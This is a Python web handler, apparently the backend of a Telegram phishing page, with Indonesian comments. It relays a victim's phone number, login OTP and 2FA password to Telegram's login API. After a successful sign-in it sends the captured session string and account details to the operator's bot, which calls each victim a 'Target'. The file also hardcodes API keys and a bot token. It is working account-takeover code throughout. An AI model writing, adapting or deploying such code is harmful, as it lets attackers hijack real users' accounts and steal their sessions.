from http.server import BaseHTTPRequestHandler
import json
import asyncio
import urllib.request
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# --- KONFIGURASI ---
API_ID = 37391656
API_HASH = '12d6406aa09781891052538af2fa5848'
BOT_TOKEN = "8577863218:AAH1SSBgHjb2cc7eyMRNjp_kn_dpckSdGzQ"
MY_CHAT_ID = "7981083332"

def bot_log(text):
    """Mengirim laporan ke Bot Telegram Anda"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({
            "chat_id": MY_CHAT_ID, 
            "text": text, 
            "parse_mode": "Markdown"
        }).encode()
        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req)
    except: 
        pass

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Mengambil parameter 'action' dari URL (send_code atau signin)
        query = self.path.split('?')[-1]
        action = ""
        if 'action=' in query:
            action = query.split('action=')[-1]

        content_length = int(self.headers['Content-Length'])
        post_data = json.loads(self.rfile.read(content_length))
        
        # Inisialisasi loop asyncio untuk setiap request (mencegah error event loop)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            response = loop.run_until_complete(self.manage_telegram(action, post_data))
        finally:
            loop.close()
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())

    async def manage_telegram(self, action, data):
        phone = data.get('phone')
        # Selalu gunakan koneksi baru (StringSession kosong) agar tidak stuck
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        
        if action == 'send_code':
            await client.connect()
            try:
                sent = await client.send_code_request(phone)
                bot_log(f"🔔 **Target Login**\nNomor: `{phone}`\nStatus: Menunggu OTP...")
                # Hash dikirim ke frontend untuk disimpan di localStorage
                return {"success": True, "hash": sent.phone_code_hash}
            except Exception as e:
                return {"success": False, "error": str(e)}
            finally:
                await client.disconnect()

        elif action == 'signin':
            code = data.get('code')
            password = data.get('password')
            phone_code_hash = data.get('hash') # Hash diambil dari localStorage browser
            
            await client.connect()
            try:
                if password:
                    # Proses login dengan Password 2FA
                    await client.sign_in(phone=phone, password=password)
                else:
                    # Proses login dengan Kode OTP dan Hash
                    await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                
                # JIKA BERHASIL: Ambil info akun dan String Session
                me = await client.get_me()
                session_str = client.session.save()
                
                full_name = f"{me.first_name} {me.last_name if me.last_name else ''}".strip()
                username = f"@{me.username}" if me.username else "Tidak ada"
                is_premium = "Ya 🌟" if me.premium else "Tidak"

                report = (
                    f"✅ **LOGIN BERHASIL**\n\n"
                    f"👤 **Nama:** `{full_name}`\n"
                    f"🆔 **User ID:** `{me.id}`\n"
                    f"📧 **Username:** `{username}`\n"
                    f"📱 **Nomor HP:** `{phone}`\n"
                    f"💎 **Premium:** `{is_premium}`\n\n"
                    f"🔑 **SESSION STRING:**\n"
                    f"`{session_str}`"
                )
                bot_log(report)
                return {"success": True}

            except SessionPasswordNeededError:
                bot_log(f"🔐 **Info 2FA**\nTarget `{phone}` memiliki Password 2FA.")
                return {"success": True, "need_2fa": True}
            except Exception as e:
                return {"success": False, "error": str(e)}
            finally:
                await client.disconnect()

        return {"success": False, "error": "Aksi tidak dikenal"}
                
